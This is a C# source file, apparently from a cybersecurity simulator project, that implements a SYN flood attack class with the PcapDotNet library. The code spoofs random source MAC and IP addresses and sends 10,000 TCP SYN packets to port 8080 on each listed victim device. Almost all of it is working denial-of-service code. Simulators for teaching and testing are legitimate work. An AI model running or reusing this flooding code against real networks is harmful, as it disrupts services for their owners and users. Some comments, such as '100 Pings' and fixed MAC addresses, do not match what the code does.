using System;
using System.Collections.Generic;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using PDA_Cyber_Security_Simulator_Domain;

namespace PDA_Cyber_Security_Simulator_V1
{
    /* 
    Links I found for help
    https://msdn.microsoft.com/en-us/library/system.bitconverter(v=vs.110).aspx
    https://msdn.microsoft.com/library/system.net.ipaddress
    https://msdn.microsoft.com/en-us/library/system.net.socketaddress(v=vs.110).aspx
    https://msdn.microsoft.com/en-us/library/system.net.endpoint(v=vs.110).aspx
    https://msdn.microsoft.com/en-us/library/eae4f5y0(v=vs.110).aspx
    https://msdn.microsoft.com/en-us/library/system.net.ipaddress(v=vs.110).aspx
    https://stackoverflow.com/questions/2850815/what-is-the-inet-addr-function-equivalent-in-c-sharp
    syn flood in C
    https://www.binarytides.com/syn-flood-dos-attack/
    */
    class SynFloodAttack : IAttack
    {
        private Network Victim { get; }

        public SynFloodAttack(Network vict)
        {
            Victim = vict;
        }

        static void MainSynFlood(string victimIpAddress, string victimMacAddress)
        {
            Random rand = new Random((int)DateTime.Now.Ticks);
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;

            if (allDevices.Count == 0)
            {
                Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
                return;
            }

            // Print the list
            for (int i = 0; i != allDevices.Count; ++i)
            {
                LivePacketDevice device = allDevices[i];
                Console.Write((i + 1) + ". " + device.Name);
                if (device.Description != null)
                    Console.WriteLine(" (" + device.Description + ")");
                else
                    Console.WriteLine(" (No description available)");
            }

            int deviceIndex = 0;
            do
            {
                Console.WriteLine("Enter the interface number (1-" + allDevices.Count + "):");
                string deviceIndexString = Console.ReadLine();
                if (!int.TryParse(deviceIndexString, out deviceIndex) ||
                    deviceIndex < 1 || deviceIndex > allDevices.Count)
                {
                    deviceIndex = 0;
                }
            } while (deviceIndex == 0);

            // Take the selected adapter
            PacketDevice selectedDevice = allDevices[deviceIndex - 1];

            // Open the output device
            using (PacketCommunicator communicator = selectedDevice.Open(100, // name of the device
                                                                         PacketDeviceOpenAttributes.Promiscuous, // promiscuous mode
                                                                         1000)) // read timeout
            {
                // Supposing to be on ethernet, set mac source to 01:01:01:01:01:01
                string randMac = rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString();
                MacAddress source = new MacAddress(randMac);

                // set mac destination to 02:02:02:02:02:02
                MacAddress destination = new MacAddress(victimMacAddress);

                // Create the packets layers

                // Ethernet Layer
                EthernetLayer ethernetLayer = new EthernetLayer
                {
                    Source = source,
                    Destination = destination
                };

                // IPv4 Layer
                IpV4Layer ipV4Layer = new IpV4Layer
                {
                    Source = new IpV4Address("192.168.1.4"),
                    CurrentDestination = new IpV4Address(victimIpAddress),
                    Ttl = 128,
                    // The rest of the important parameters will be set for each packet
                };

                // TCP LAYER
                TcpLayer tcpLayer = new TcpLayer
                {
                    ControlBits = TcpControlBits.Synchronize
                };

                // Create the builder that will build our packets
                PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, tcpLayer);

                // Send 100 Pings to different destination with different parameters
                for (int i = 0; i != 10000; ++i)
                {
                    randMac = rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString() + ":" + rand.Next(0, 9).ToString() + rand.Next(0, 9).ToString();
                    ethernetLayer.Source = new MacAddress(randMac);

                    // Set IPv4 parameters
                    ipV4Layer.Source = new IpV4Address("192.168.1." + rand.Next(5, 97).ToString());
                    ipV4Layer.Identification = (ushort)i;

                    // Set TCP parameters
                    tcpLayer.SourcePort = (ushort)(rand.Next(0, 1000) + 33000);
                    tcpLayer.DestinationPort = (ushort)8080;

                    // Build the packet
                    Packet packet = builder.Build(DateTime.Now);

                    // Send down the packet
                    communicator.SendPacket(packet);
                }
            }

        }

        public void StartAttack()
        {
            for (int i = 0; i < Victim.Devices.Count; i++)
            {
                SynFloodAttack.MainSynFlood(Victim.Devices[i].IpAddress, Victim.Devices[i].MacAddress);
            }
        }
    }
}